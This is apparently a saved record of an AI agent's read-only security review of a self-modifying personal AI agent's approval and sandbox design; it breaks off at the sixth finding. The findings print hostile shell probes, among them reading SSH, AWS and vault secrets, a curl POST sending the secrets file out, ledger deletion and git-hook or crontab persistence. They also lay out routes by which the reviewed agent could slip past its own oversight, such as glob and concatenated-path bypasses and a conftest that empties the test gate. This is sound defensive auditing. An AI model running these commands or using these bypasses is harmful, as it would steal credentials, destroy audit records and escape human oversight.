# read:safety-guardian-execution

*Workflow: review · Phase: Read · Agent id: `a91a85b6ffc524cee` · Tool calls: 58*

## Task given to the agent

```text
You are reviewing the ARCHITECTURE of Simorgh, a self-improving personal AI agent written in Python (stdlib-first) at /Users/saeed/ws/Simorgh. The creator built it from scratch: ~87k lines in simorgh/, 18 subsystems (one package each) composed by a Kernel, talking only via typed messages on an async Bus, all state in an append-only Ledger of events, a Guardian that is the sole approver of every effect (HMAC token re-verified by Execution), worktree-isolated self-patching, a bootloader (simloader.py) that gates the checkout with the unit suite and rolls back. It chats (CLI/TUI/HTTP/Telegram/WhatsApp), talks (voice pipeline), controls the house (Home Assistant, Reolink cameras, Ring, Cast/Android TV), and runs benchmarks (GAIA/BFCL/SWE-bench).
  
  The creator asked: "review its architecture, evaluate it, tell me where I went wrong and how to improve it."
  
  Ground rules for you:
  - Read the CODE, not the docs, to establish what is true today. docs/EVOLUTION.md (5,254 lines) is a HISTORY; a bug it describes has very likely been fixed since. Do not report a historical finding as current state.
  - Previous reviews already exist and you must NOT simply repeat them. Already known (do not re-report unless you have something materially new to add): cameras use local ffmpeg/HLS instead of Home Assistant; self_patch.draft tool is named in learning/pipeline.py but not registered; Self Model capabilities["tools"] is never populated; no in-prompt sliding dialogue buffer for chat turns (orchestration/context.py); Ledger default backend is JSONL and ~1.4 GB; CHAT profile binds 34 tools; STT latency degrades under self-inflicted load; "unconnected wire" (designed slot, one side implemented, nobody writes it) is the project's dominant bug shape; test coverage thin in persona/learning/worldmodel; sim.sh auto-approve flips one boolean. Read docs/architecture-review-2026-09-18.html and docs/architecture-audit-2026.md quickly if you want the full list.
  - Useful orientation docs (read briefly, then go to code): docs/module-map.md, docs/architecture.md, docs/blueprint/02-system-architecture.md, docs/blueprint/03-contracts-and-messaging.md.
  - Every finding MUST cite file:line evidence you actually read, and where feasible a command whose output you quote. If a claim depends on runtime behaviour, try to establish it by a cheap command (python -c import + inspect, grep, wc, reading ~/.simorgh/simorgh.toml, listing ~/.simorgh/ledger). Do NOT boot the full system, do NOT run the full test suite, do NOT run anything that calls a paid model, do NOT modify any file in the repo.
  - Think like a senior systems architect. Distinguish (a) a design decision that is wrong or over-built for this system's real scale (one laptop, one family), (b) a design that is right but the implementation undermines it, (c) a genuine bug. Say which.
  - Your final text is data for an orchestrator, not a message to a human. Return only the structured output.
  
  
  CONCERN: the safety topology -- Guardian rules, HMAC tokens, Execution's tool protocol and sandboxes, protected paths, denylist, worktree landing, and what the self-modification path really permits.
  Read simorgh/guardian/ (rules.py, config.py, service.py, tokens), simorgh/execution/ (service.py, tools.py, verifier.py, worktrees, sandboxes, safety/path/net modules, run_shell/run_remote gating), simorgh/verification/ checks, simorgh/learning/pipeline.py, docs/plans/worktree-landing-design.md briefly.
  Questions: What actually stops Sim from harming the creator's machine or accounts today? Enumerate the tools that can reach the filesystem, network, shell, subprocess, credentials, house devices; for each say what gate applies. Is the Guardian's rule set evaluating the RIGHT thing (the proposal payload) or something a model could route around (e.g. write_file to a path outside the worktree; run_python_sandboxed spawning subprocess; web_fetch to LAN; a tool that itself shells out)? Is the HMAC token scheme adding real security inside one process, or ceremony? Is the protected-path list complete (what about sim.sh, simloader.py, tests/, .git hooks, ~/.simorgh config, the ledger)? Does 'auto-approve irreversible' combined with worktree landing mean Sim can land arbitrary code on main with only the test suite as gate -- and can it edit tests? Are physical-world actions (locks, cameras, TV) gated differently from code? Evaluate whether the safety design is proportionate and where its real holes are.
```

## What the agent did (tool trail)

| # | Tool | What | Result (first 160 chars) |
|---|---|---|---|
| 1 | Bash | List guardian, execution, verification, learning packages with line counts | simorgh/execution/: __init__.py __pycache__ capabilities.py config.py container.py doctext.py domainstatus.py energy external.py geocode.py home htmltext.py kno |
| 2 | Bash | Read guardian rules module | <persisted-output> Output too large (34.9KB). Full output saved to: /Users/saeed/.claude/projects/-Users-saeed-ws-Simorgh/488b3cca-edac-4c83-98e1-f1e7db34bf14/t |
| 3 | Read | /Users/saeed/ws/Simorgh/simorgh/guardian/rules.py | 1 """The pipeline's rules, in the fixed order 09-guardian.md section 5.1 2 specifies. Each rule returns `Decision(kind=allow\|deny\|escalate\|abstain, 3 ...)`; `ab |
| 4 | Read | /Users/saeed/ws/Simorgh/simorgh/guardian/config.py | 1 """Guardian configuration (09-guardian.md section 3.5). A subset of the 2 spec's full table. `budget_pressure_tighten_at` and `max_consecutive_ 3 failures` ar |
| 5 | Read | /Users/saeed/ws/Simorgh/simorgh/guardian/tokens.py | 1 """Thin wrapper over `contracts.security` (09-guardian.md section 5.4): 2 Guardian's only job with the secret is to mint tokens; verification is 3 Execution's |
| 6 | Read | /Users/saeed/ws/Simorgh/simorgh/guardian/pipeline.py | 1 """Runs `rules.DEFAULT_PIPELINE` in order and folds the per-rule 2 Decisions into one Verdict (09-guardian.md section 5.1): the first deny 3 wins outright; ot |
| 7 | Read | /Users/saeed/ws/Simorgh/simorgh/guardian/api.py | 1 """Guardian's internal protocol (09-guardian.md section 3.4). `Rule` is 2 the unit every check in `rules.py` implements; `Pipeline` runs them in a 3 fixed ord |
| 8 | Read | /Users/saeed/ws/Simorgh/simorgh/guardian/posture.py | 1 """Trust posture (09-guardian.md section 5.3): a projection over the 2 `guardian:trust` Ledger stream that only ever tightens by message -- 3 loosening is exc |
| 9 | Read | /Users/saeed/ws/Simorgh/simorgh/guardian/service.py | 1 """Guardian's Service (09-guardian.md section 5): the only subsystem the 2 Kernel/Bus enforcement lets subscribe to `action.proposed`. Runs every 3 proposal t |
| 10 | Read | /Users/saeed/ws/Simorgh/simorgh/execution/verifier.py | 1 """Execution's own, independent verification of an `action.approved` 2 message (08-execution.md section 5.1): token verification at the 3 executor, not only a |
| 11 | Bash | Read contracts security module | """Approval tokens and subsystem tokens (docs/blueprint/03 section 10; 02 section 3). An approval token binds a Guardian decision to the *exact* action it appro |
| 12 | Read | /Users/saeed/ws/Simorgh/simorgh/execution/service.py | 1 """Execution's Service (08-execution.md section 5): the only subsystem 2 the Kernel/Bus enforcement lets subscribe to `action.approved`. Verifies 3 every appr |
| 13 | Bash | List tool classes with their name, read_only and reversibility declarations | 126:class ReadFileTool: 127: name = "read_file" 129: read_only = True 130: reversibility = "read_only" 187:class ListDirTool: 188: name = "list_dir" 190: read_o |
| 14 | Bash | Read path safety module | """Path-safety boundary, ported from src/cognition/tool_protocol.py's `_resolve_safe_path`/`safe_read_file`/`safe_list_dir` (08-execution.md section 5, `pathsaf |
| 15 | Bash | Read net safety and shell modules | """The SSRF guard shared by every tool that opens an outbound URL (`web_fetch`, `render_page`): http(s) only, and unless explicitly allowed, the resolved addres |
| 16 | Bash | Read script runner and remote modules | """`run_script`: run a Python program with the project's interpreter, the repo importable, and the network reachable. The gap this fills, from the 2026-09-09 po |
| 17 | Bash | Enumerate every builtin tool with its declared read_only and reversibility | (eval):1: command not found: timeout |
| 18 | Bash | Read execution config, first part | """Execution configuration (08-execution.md section 3.5) -- a working subset: the knobs the tools built this phase actually read. Shell, relaunch, hot_swap, and |
| 19 | Bash | Read execution config, second part |  # anything here to any machine on the internet. remote: bool = False remote_timeout_s: float = 300.0 remote_connect_timeout_s: float = 15.0 remote_output_max_c |
| 20 | Bash | Read run_python_sandboxed and run_js_sandboxed tool implementations | def _apply_rlimits(cpu_seconds: int, memory_bytes: int): def _set() -> None: for res, value in ( (getattr(resource, "RLIMIT_CPU", None), cpu_seconds), (getattr( |
| 21 | Bash | Read write-scope helper, apply_source_patch, replace_in_file, apply_skill and git_commit tools |  scope re-check independent of Guardian's own (v1's "two boundaries, not one").""" subject = subject.replace("\\", "/") if ".." in Path(subject).parts or not pa |
| 22 | Bash | Read worktree manager and landing tools | """One worktree per task: where Sim's own edits happen, and how they land. Until 2026-09-11 a patch task edited the live checkout -- the very tree the running p |
| 23 | Bash | Read sim.sh launcher and the live simorgh.toml with secret-looking lines removed | #!/usr/bin/env bash # Launches Simorgh from anywhere -- resolves its own location so it works # regardless of the caller's current directory. # # Since 2026-09- |
| 24 | Bash | Enumerate every builtin tool with declared read_only and reversibility | TOTAL 98 Counter({'reversible': 51, 'read_only': 37, 'irreversible': 10}) cam_siren ro=False rev=irreversible home.cameras install_package ro=False rev=irrevers |
| 25 | Bash | Read rest of sim.sh and find where auto-approve is set | ----GREP---- (eval):1: no matches found: --include=*.py |
| 26 | Bash | Read tool_root and the head of the write-scope helper | 109:def tool_root(config: Config, ctx: ToolContext \| None, path: str = "") -> Path: 1496:def _python_syntax_problem(subject: str, code: str) -> str \| None: 1519 |
| 27 | Bash | Find how the HMAC secret is distributed to subsystems in the kernel | simorgh/kernel/service.py:2:subsystems/03-kernel.md section 5.1). Boots config -> secrets -> Ledger simorgh/kernel/service.py:55:from .secrets import SecretStor |
| 28 | Bash | Check whether the bus enforces topic publisher and subscriber allow-lists | 116:ACTION_PROPOSED = "action.proposed" 117:ACTION_APPROVED = "action.approved" 291: ACTION_PROPOSED: frozenset({"guardian"}), 292: ACTION_APPROVED: frozenset({ |
| 29 | Bash | Find where Orchestration sets a proposal's reversibility | simorgh/orchestration/service.py:146: its `reversibility`/`read_only` config completely unapplied for simorgh/orchestration/service.py:149: operator who set `re |
| 30 | Bash | Read the house policy and the home and media tools' reversibility declarations | """How dangerous is this service call? A pure function, in contracts, so Guardian and the tool that proposes the call compute the same answer from the same inpu |
| 31 | Bash | Read learning pipeline self-patch path | """`PatchPipeline` / `SkillPipeline`: the self-patch and skill state machine (spec section 5.2/5.3) -- policy only. Every actual file read/write/test/commit/rel |
| 32 | Bash | List verification checks | __init__.py __pycache__ _baseline.py _files.py denylist_immunity.py didanything.py docstring.py fullsuiteran.py invariants.py isolated_suite.py js_syntax.py ren |
| 33 | Bash | Read run_container tool | """`run_container`: anything, in any language, without touching this machine. `run_python_sandboxed` runs Python with no repo access; `run_script` runs Python w |
| 34 | Bash | List runtime data directory, git hooks and gitignore | benchmark benchmark-waves benchmarks bus cognition curiosity execution guardian interface learning ledger memory orchestration persona planning reflection secre |
| 35 | Bash | Find auto-approve wiring, HMAC secret holders, and bus publisher enforcement | simorgh/execution/security/tools.py:192: raw_env = (self._env.get("SIMORGH_GUARDIAN_AUTO_APPROVE") or "").strip() simorgh/execution/security/tools.py:195: env_o |
| 36 | Bash | Read tool_root and the sim_command tool | from .shell import RunShellTool from .websearch import WebSearchTool def tool_root(config: Config, ctx: ToolContext \| None, path: str = "") -> Path: """The tree |
| 37 | Bash | Read how Orchestration builds a proposal's reversibility and scope |  # one slow MCP server -- the intersection would drop every builtin # from every later session, leaving a patch session with no # read_file (observer, 2026-09-0 |
| 38 | Bash | Find the loader gate's pytest invocation, pytest config files, and secrets file permissions | 66:def pytest_parallel_args() -> list[str]: 67: """`-n auto` when pytest-xdist is installed, else nothing. 284: subclass pulls whatever it can out of it (a pyte |
| 39 | Bash | Run the Guardian pipeline offline with auto-approve on against a set of probing proposals | approved shell_refusal=None run_shell: {'command': 'cat ~/.simorgh/secrets.toml'} approved shell_refusal=None run_shell: {'command': 'curl -s -X POST --data-bin |
| 40 | Bash | See how the session uses worktrees and how SkillTool executes a skill | 54:# whole-suite gate, or a live checkout in the way. The worktree stays, 58:# in their own worktree (execution/worktree.py) when one can be opened. 411: "workt |
| 41 | Bash | Read the worktree landing design intro and the home_call tool gate | # One worktree per task: how Sim changes its own code Design and build, 2026-09-11 (Fable). Built in the same pass; this document records what exists and the de |
| 42 | Bash | Check whether Guardian recomputes the house safety class, whether grant_capability exists, who holds the HMAC secret, and how auto-approve d | ---classify--- simorgh/contracts/home/__init__.py:25:from .policy import classify_call simorgh/contracts/home/__init__.py:27:__all__ = ["Entity", "HomeAssistant |
| 43 | Bash | Find where the auto-approve environment variable is set in practice | ---ENV--- PWD=/Users/saeed/ws/Simorgh OLDPWD=/Users/saeed/ws/Simorgh ---RC--- ---DOCS--- docs/architecture.md docs/architecture-review-2026-09-18.html docs/plan |
| 44 | Bash | Read the loader gate's untracked-code check, selection and result reading |  so a tag being ignored is visible rather than merely absent.""" out = git("tag", "--list", f"{TAG_PREFIX}*", cwd=repo).stdout.split() return sorted(tag for tag |
| 45 | Bash | Read the landing gate implementation in RunTestsTool | 1272: def gate(self, root: Path) -> ToolResult: 1279: def failing_alone(self, root: Path, nodeids: tuple[str, ...]) -> frozenset[str] \| None: 1310: def _run_iso |
| 46 | Bash | Check whether the bus client binds the publisher identity or trusts the message's source field | 73: self._source = source 95: return self._source 161: return caused_by.caused(type, payload, source=self._source, **routing) 163: type, source=self._source, pa |
| 47 | Bash | Run the Guardian pipeline with defaults (human approval required) against skill and sandbox payloads that spawn processes without the denyli | bandit installed: True shellcheck not found shellcheck: not installed denied layer=static_analysis apply_skill: "{'subject': 'simorgh_skills/helper.py', 'code': |
| 48 | Bash | Find kernel-level auto-approve handling and which tool profiles offer shell and house tools | simorgh/kernel/configcheck.py:37:# `irreversible_requires_human = False`; the dataclass default is True. simorgh/kernel/configcheck.py:44: "guardian": {"irrever |
| 49 | Bash | Read the CHAT profile tool list | """Per-kind Profiles (16 section 5). v1 kept its own per-agent step ceilings (`DEFAULT_MAX_TOOL_STEPS` in `self_patch.py`/`research_task.py`); these are the sam |
| 50 | Bash | Check authentication on the HTTP API and sender allow-lists on the chat channels | __init__.py __pycache__ activity.py api.py benchmarkchart.py benchmarkview.py config.py dashfeeds.py dispatch.py httpapi.py live_status.py panel.py parser.py re |
| 51 | Bash | Find which channels can answer a Guardian approval prompt | simorgh/interface/service.py:120: topics.SYSTEM_RESUME, topics.SYSTEM_STOP, topics.UI_PROMPT_ANSWERED, topics.SYSTEM_HEALTH, simorgh/interface/service.py:1217:  |
| 52 | Bash | Read the rest of the isolated test run used by the landing gate |  # Off the event loop. This `subprocess.run` used to sit # directly in the coroutine, and for the whole pytest run # -- 272s measured live, 2026-09-10 -- the Ke |
| 53 | Bash | Probe shell commands against the live-default Guardian pipeline and the tool's own refusal list | guardian=approved tool_refusal=none find ~/.simorgh/ledger -type f -delete guardian=approved tool_refusal=none python3 -c "import shutil; shutil.rmtree('/Users/ |
| 54 | Bash | Check HTTP interface bind and auth settings and Telegram sender handling | 89: http_host: str = "127.0.0.1" 90: http_port: int = 8765 170: http_host=str(data.get("http_host", default.http_host)), 171: http_port=int(data.get("http_port" |
| 55 | Bash | Check whether the HTTP API token is configured live and which POST routes exist | SIM_API_TOKEN key present in secrets.toml (count): 1 ---token sourcing--- simorgh/kernel/registry.py:61:# `SIM_API_TOKEN` gates `interface/httpapi.py` simorgh/k |
| 56 | Bash | Count the refusal, denylist and protected lists and rule pipeline; count recent commits to the rules module | shell refusal patterns: 32 guardian denylist patterns: 13 protected subjects: 12 ('docs/SOUL.md', 'src/orchestrator/soul.py', 'src/orchestrator/audit.py', 'src/ |
| 57 | Bash | See how a pending Guardian prompt is answered and how channel senders are allow-listed |  asyncio.run_coroutine_threadsafe(self._handle_line(line), self._loop).result() except Exception as exc: # noqa: BLE001 -- mirrors _handle_line's own # crash bo |
| 58 | Bash | Confirm which session kinds get a worktree and what the immunity index remembers | 59:WORKTREE_KINDS = frozenset({"patch", "skill"}) 60-CANCELLED_REASON = "the task was cancelled" 61- 62-# `workspace/` is the one directory that is both readabl |

## Structured reply

**concern:** Safety topology: Guardian rules, HMAC tokens, Execution tool protocol and sandboxes, protected paths, denylist, worktree landing, and what the self-modification path really permits.

**summary of what is actually there:** Every tool call is an `action.proposed` message that only Guardian may subscribe to (simorgh/contracts/topics.py:291) and only Guardian/Kernel may answer with `action.approved` (topics.py:296); the bus client binds the publisher identity at construction (simorgh/bus/client.py:73,184), so a subsystem cannot spoof `source`. Guardian runs 12 rules in fixed order (simorgh/guardian/rules.py:743-756): paused, mode, protected, scope (always abstains, rules.py:337-349), denylist (13 regexes), bandit static analysis (HIGH only), shellcheck (not installed on this machine), package, grant (guards a `grant_capability` tool that is not registered anywhere), immunity, budget, reversibility. On approval it mints an HMAC over (action_id, tool, sha256(args), expiry) with a per-run secret held only by guardian and execution (simorgh/kernel/registry.py:50); Execution re-fetches the args from the ledger's `received` event and re-verifies before running (simorgh/execution/verifier.py:37-57, service.py:751-770). There are 98 builtin tools plus 3 worktree tools: 37 read_only, 51 reversible, 11 irreversible. The `reversibility` label Guardian evaluates is supplied by the proposer, Orchestration (simorgh/orchestration/tools.py:693-716), from a table filled by `tool.registered` messages; Guardian does not subscribe to `tool.registered` and has no independent view of any tool. In `guarded` mode, read_only and reversible proposals are allowed outright; irreversible ones escalate to a human only if `irreversible_requires_human` is true, and the Kernel sets that to False when `simorgh.toml` has no `[guardian]` section (simorgh/kernel/service.py:203), which the live `~/.simorgh/simorgh.toml` does not. So, live, every proposal that survives the deny rules runs without a human. File tools (`apply_source_patch`, `replace_in_file`, `apply_skill`) enforce repo-relative write scopes (`simorgh/`, `tests/`, `tools/`, `docs/`, `simorgh_skills/`, `workspace/`) and reads go through `pathsafety.resolve_safe_path` with credential-name and symlink/hardlink checks. `run_shell` runs `subprocess.run(shell=True)` in the repo or worktree with credentials stripped from the child env and a 32-pattern accident list (simorgh/execution/shell.py:53-118); `run_script` runs real Python with the repo importable and network; `run_python_sandboxed` and `SkillTool` run `python -I` with rlimits, an empty env and no filesystem confinement (tools.py:1016-1075, 2761-2830). Patch and skill tasks work in a git worktree under `~/.simorgh/execution/worktrees` and land via rebase, a whole-suite gate run on a copy, and `git merge --ff-only` (simorgh/execution/worktree.py:190-260); chat sessions edit the live tree directly (orchestration/session.py:59). Protected paths are a 12-entry substring list matched against `subject`/`path` arguments and, for `code`/`command` payloads, against path-looking tokens in the program text when it also looks like a write (rules.py:212-232, 272-334). The bootloader `simloader.py` gates each boot on the core suite with a run-count baseline (simloader.py:655-696) and rolls back to the last `sim-good-*` tag. External surfaces are in good shape: Telegram is deny-by-default with an allow-list (interface/telegram.py:82-187, contracts/channels.py:106), and the HTTP API bound to 0.0.0.0 has `SIM_API_TOKEN` configured (secrets.toml contains the key; httpapi.py:224-242).

### strengths

- Approver/executor split with independent re-verification is real, not decorative: Execution re-reads the args from the ledger `received` event and recomputes the HMAC (simorgh/execution/verifier.py:37-57; service.py:715-770), and the secret is scoped to only guardian and execution (kernel/registry.py:50; kernel/context.py:116-122).
- Bus identity is bound per client, not per message: `self._source` is fixed at construction and `check_publish` uses it (simorgh/bus/client.py:73,184), with publisher/subscriber allow-lists on the action topics (contracts/topics.py:289-300). Orchestration cannot publish `action.approved`.
- Deny-first, order-fixed pipeline with 'abstain' as a distinct verdict, and the explicit rule that a missing optional linter abstains rather than allows (rules.py:437-470, 497-509). Good discipline for a one-person project.
- `run_remote` is correctly shaped: the host, user and key come from the operator's environment, never from the model, BatchMode and strict host keys by default (simorgh/execution/remote.py:14-33, 108-125).
- `run_container` is the only tool whose isolation actually runs the right way (no bind mount of the repo, image-prefix allowlist, registry-host spoof check) (simorgh/execution/container.py:1-25, 46-75).
- The bootloader's gate has learned from three demonstrated attacks: exit code must be 0, the summary must not report failures, tests must have RUN, and the count may not shrink more than 10% from the last green baseline; untracked conftest/pytest.ini refuse a bless (simloader.py:486-500, 655-696).
- External chat surfaces are gated correctly: Telegram deny-by-default allow-list (interface/telegram.py:109-110, 186-187; contracts/channels.py:106-118) and the LAN-bound HTTP API has a configured bearer token (SIM_API_TOKEN present in ~/.simorgh/secrets.toml; httpapi.py:224-242, 593).
- `pathsafety` closes the symlink, hardlink and case-folding read bypasses that observers found, with the resolved path re-checked against readable roots (simorgh/execution/pathsafety.py:150-215).
- Shell child env strips credential-shaped variables (shell.py:126-141) and `run_script` passes a curated env list rather than os.environ (config.py:217-222).

### findings

##### 1. Live default auto-approves every irreversible action, so the door lock, sirens and shell run with no human in the loop

- **kind:** wrong-design
- **severity:** critical
- **claim:** With the live config (no `[guardian]` section in ~/.simorgh/simorgh.toml) the Kernel sets `irreversible_requires_human=False` (kernel/service.py:203), Guardian has no house-specific rule and does not recompute `classify_call`, and `HomeCallTool` computes the `human` class but never refuses on it, so `home_call lock.unlock`, `cam_siren`, `ring_siren`, `run_shell`, `run_script` and `install_package` are all approved with nobody asked.
- **evidence:**
  - simorgh/kernel/service.py:203 `guardian_section.setdefault("irreversible_requires_human", False)`
  - ~/.simorgh/simorgh.toml has sections [voice] [interface] [execution] [cognition] and no [guardian]; `env | grep SIMORGH` prints nothing
  - `grep -rn classify_call simorgh/` -> only contracts/home/policy.py, execution/home/tools.py, orchestration/tools.py; nothing in simorgh/guardian/
  - simorgh/contracts/home/policy.py:22-24 promises "`sim.sh` auto-approves irreversible actions by default. For the house that default is wrong, and `human` here is meant to survive it" -- no code implements the survival
  - simorgh/execution/home/tools.py:255-266 computes `worst` then calls `client.call(...)` unconditionally; `worst` only lands in metadata
  - Offline pipeline run with Config(irreversible_requires_human=False): `approved  home_call: {'service': 'lock.unlock', ...}`, `approved  cam_siren: {...}`, `approved  run_shell: {'command': 'cat ~/.simorgh/secrets.toml'}`
- **why it matters:** One boolean, defaulted off by the launcher, is the only thing standing between the model and unlocking the front door or exfiltrating the vault. The design intent (physical-world 'human' class survives auto-approve) is written in a docstring and nowhere else.
- **recommendation:** Make `human`-class house calls a Guardian rule that ignores `irreversible_requires_human`: add a `HomeSafetyRule` that calls `classify_call` on `home_call` args (the pure function already exists for exactly this reason) and returns `escalate` regardless of the switch; have `HomeCallTool` refuse `worst == "human"` unless the approval carried a `human_approved` constraint. Separately, split the one boolean into two: `code_irreversible_requires_human` and `world_irreversible_requires_human`, default the second to True in the Kernel.
- **confidence:** 0.95

##### 2. The vault, the ledger and the machine are outside every protected list; run_shell reads secrets.toml, ~/.ssh and ~/.aws and can rewrite the vault

- **kind:** missing
- **severity:** critical
- **claim:** Protected subjects are 12 repo-relative substrings; `~/.simorgh/secrets.toml` (0600, holds every provider token, the HA token, SIM_API_TOKEN), `~/.simorgh/ledger` (the audit trail), `.git/hooks`, `~/.ssh`, `~/.aws` and the macOS keychain are reachable by `run_shell` and, via `os.execvp`, by `run_script` in the CHAT profile, and Guardian approves all of it under the live default.
- **evidence:**
  - simorgh/guardian/config.py:21-41 DEFAULT_PROTECTED_SUBJECTS -- all repo paths; only `simorgh.toml` is a filename match
  - Offline pipeline with live default: `approved cat ~/.simorgh/secrets.toml`; `approved curl -s -X POST --data-binary @$HOME/.simorgh/secrets.toml https://...`; `approved printf ... > ~/.simorgh/secrets.toml`; `approved find ~/.simorgh/ledger -type f -delete`; `approved python3 -c "import shutil; shutil.rmtree('/Users/saeed/.simorgh/ledger')"`; `approved cat ~/.ssh/id_ed25519`; `approved cat ~/.aws/credentials`; `approved security find-generic-password -ga github`; `approved printf '#!/bin/sh...' > .git/hooks/post-checkout`; `approved launchctl load ~/Library/LaunchAgents/x.plist`; `approved (crontab -l; echo ...) | crontab -`
  - simorgh/execution/shell.py:53-118 refusal list has no entry for ~/.simorgh, .git/hooks, ssh, crontab install, launchctl, osascript; `refusal_for(...)` returned None for every command above
  - `ls -la ~/.simorgh/secrets.toml` -> `-rw------- ... 2116 bytes`
  - simorgh/orchestration/profiles.py:59 CHAT includes `run_script`; offline pipeline: `approved run_python_sandboxed {'code': "import os\nos.execvp('/bin/sh',['sh','-c','cat ~/.simorgh/secrets.toml'])"}` (same code-scan rules apply to run_script)
  - sim.sh:42-52 runs `git checkout "$LAST_GOOD" -- simloader.py` during recovery, which fires a post-checkout hook
- **why it matters:** This is the answer to 'what stops Sim from harming the creator's machine or accounts today': for the machine and the accounts, nothing but the model's disposition. The ledger is the system's memory of what it did and can be erased by the thing it records; a planted git hook runs inside the bootloader's own rollback path; the vault can be repointed at an attacker's Home Assistant.
- **recommendation:** Stop trying to enumerate bad commands and confine the process instead. On macOS, run every subprocess-spawning tool (`run_shell`, `run_script`, `SkillTool`, `run_python_sandboxed`) under `sandbox-exec` with a profile that denies reads of `~/.simorgh/secrets.toml`, `~/.ssh`, `~/.aws`, the keychain, and writes to `~/.simorgh/ledger`, `.git/hooks`, `~/Library/LaunchAgents`; or run them as a separate low-privilege user. Until then: add `~/.simorgh/`, `.git/`, `~/.ssh`, `~/.aws`, `~/Library` to the protected substring list (cheap, one line, closes the literal cases the pipeline already catches for `simorgh.toml`), and move the ledger to a path the sandbox denies.
- **confidence:** 0.95

##### 3. Protected paths are enforced on the proposal's text, not on the diff that lands; a glob or a concatenated string walks straight through, and worktree_land never re-checks

- **kind:** right-design-undermined
- **severity:** high
- **claim:** ProtectedRule is a substring scan of path-looking tokens in the command/code (rules.py:152-161, 212-232) and its docstring admits 'a path assembled from pieces already defeats the scan'; `WorktreeManager._land` rebases and fast-forwards whatever the branch contains with no `git diff --name-only` check against protected subjects, so the one place a protected-path check is cheap and exact has none.
- **evidence:**
  - Offline pipeline (live default): `denied cp workspace/rules.py simorgh/guardian/rules.py` but `approved cp workspace/rules.py simorgh/guardi*/rules.py && git add -A && git commit -qm x` and `approved python3 -c "open('simorgh/gu'+'ardian/rules.py','w').write('')"`
  - simorgh/execution/worktree.py:190-260 `_land`: status -> rebase -> gate -> `git merge --ff-only`; no path inspection of `main_sha..branch_sha`
  - simorgh/guardian/rules.py:147-151 'Deliberately crude ... under-matching costs the whole protection model, which is the trade this makes'
  - Offline pipeline: `approved cd /Users/saeed/ws/Simorgh && git add -A && git commit -qm 'direct to main'` (shell refusal only matches `git -C .../Simorgh`, shell.py:107-108) -- landing can be bypassed entirely by cd-ing to the live checkout
- **why it matters:** The corrigibility boundary (guardian/, execution/, contracts/, kernel/, simloader.py) is the load-bearing safety idea of the whole system and it is enforced by a regex over model text. The landing step already has the exact list of touched files for free.
- **recommendation:** In `_land`, run `git diff --name-only <main_sha>..<branch_sha>` and refuse if any path matches `protected_subjects` (pass the list in from Guardian's config or duplicate the 12 strings; it is a 6-line change). Do the same in the bootloader's bless. Add `cd`-to-repo-root and `git commit` outside the worktree to the shell refusals, or better, run `run_shell` from a worktree with `GIT_DIR`/`GIT_WORK_TREE` unset and the live checkout path made unreadable by the sandbox.
- **confidence:** 0.9

##### 4. Skills are persistent, unconfined arbitrary code labelled 'reversible', so they never reach the human even with auto-approve off

- **kind:** wrong-design
- **severity:** high
- **claim:** `apply_skill` and every `skill:<name>` tool are `reversibility="reversible"` and therefore auto-allowed in guarded mode regardless of `irreversible_requires_human`; the skill runs `python -I` with rlimits, empty env, cwd=repo_root and no filesystem or network confinement, and the denylist/bandit scan on `apply_skill` misses `os.execvp`, `asyncio.create_subprocess_shell` and `pathlib.write_text` to a concatenated path.
- **evidence:**
  - simorgh/execution/tools.py:2385-2388 ApplySkillTool `reversibility = "reversible"`; tools.py:2775-2776 SkillTool `reversibility = "reversible"`; tools.py:2800-2815 subprocess.run with `cwd=str(self._config.repo_root), env={}` and the comment 'A skill already runs as arbitrary Python with no filesystem confinement'
  - Offline pipeline with DEFAULT Config (irreversible_requires_human=True, bandit installed): `approved apply_skill {... os.execvp('/bin/sh', ['sh', '-c', text]) ...}`, `approved apply_skill {... asyncio.create_subprocess_shell(t) ...}`, `approved apply_skill {... pathlib.Path('simorgh/gu' + 'ardian/rules.py').write_text(text) ...}`, `approved skill:helper {'text': 'cat ~/.simorgh/secrets.toml'}`; only `os.popen` was caught (bandit B605)
  - simorgh/execution/service.py:776-785 lazy-loads any `skill:<name>` from `simorgh_skills/<name>.py` on demand after a restart, and `_load_skill` re-reads the file from disk (service.py:634-650), so a `run_shell` edit to a skill file is executed on next call
- **why it matters:** The 'reversible' label is what the pipeline actually gates on, and it is assigned by the tool author's guess, not by what the payload does. A skill is the one tool that survives restarts, so this is the persistence channel.
- **recommendation:** Label `apply_skill` and `skill:*` irreversible (they are), and give SkillTool the same confinement as the rest (sandbox-exec profile, no network). Longer term, drop `reversibility` as a per-tool constant and make it a per-proposal function of (tool, args), which the home tools already do -- generalise `to_action_payload`'s `home_call` special case into a table of classifiers.
- **confidence:** 0.9

##### 5. The landing gate is weaker than the bootloader's gate and can be neutered by an edit to tests/, which Sim may write

- **kind:** right-design-undermined
- **severity:** high
- **claim:** `RunTestsTool._run_isolated` treats pytest exit 5 (nothing collected) as ok and never checks the summary line or a run-count baseline, while `simloader.unit_verdict` does all three; `tests/` is in `write_scopes_source` and excluded from ProtectedRule's path scan, so a branch that adds `tests/conftest.py` with `pytest_collection_modifyitems(...): items.clear()` passes `worktree_land` and reaches main.
- **evidence:**
  - simorgh/execution/tools.py:~1372 `no_tests = completed.returncode == _PYTEST_NO_TESTS_COLLECTED or usage_error`; `ok = completed.returncode == 0 or no_tests`; used by `gate()` at tools.py:1272-1277 which `_land` calls
  - simloader.py:655-696 `unit_verdict`: refuses exit 5, refuses 'N failed' on exit 0, refuses `ran <= 0`, refuses `ran < baseline*0.9` -- three attacks named in its docstring, none carried into the landing gate
  - simorgh/execution/config.py:105 `write_scopes_source` includes `"tests/"`; rules.py:155-161 `_mentioned_paths` drops any token starting with `tests/`
  - Offline pipeline: `approved apply_source_patch {'subject': 'tests/conftest.py', 'code': 'def pytest_collection_modifyitems(config, items):\n    items.clear()\n'}` and `approved run_shell printf ... > tests/conftest.py`; `ls tests/conftest.py` -> does not exist today, so it would be a new file
- **why it matters:** 'Only the test suite as gate' is exactly right as a description, and Sim can edit the gate. The loader would catch it at the next boot and roll back, but the commit is on main until then and every other task rebases onto it.
- **recommendation:** Extract `unit_verdict` (and the baseline file) from simloader.py into `contracts/` and call it from `_run_isolated` when `target == "tests"`. In `_land`, refuse a branch whose diff touches `conftest.py`, `pytest.ini`, `pyproject.toml` or deletes test files unless a human approved that specific landing.
- **confidence:** 0.9

##### 6. Guardian trusts the proposer's reversibility label and has no view of the tool registry

- **kind:** right-design-undermined
- **severity:** medium
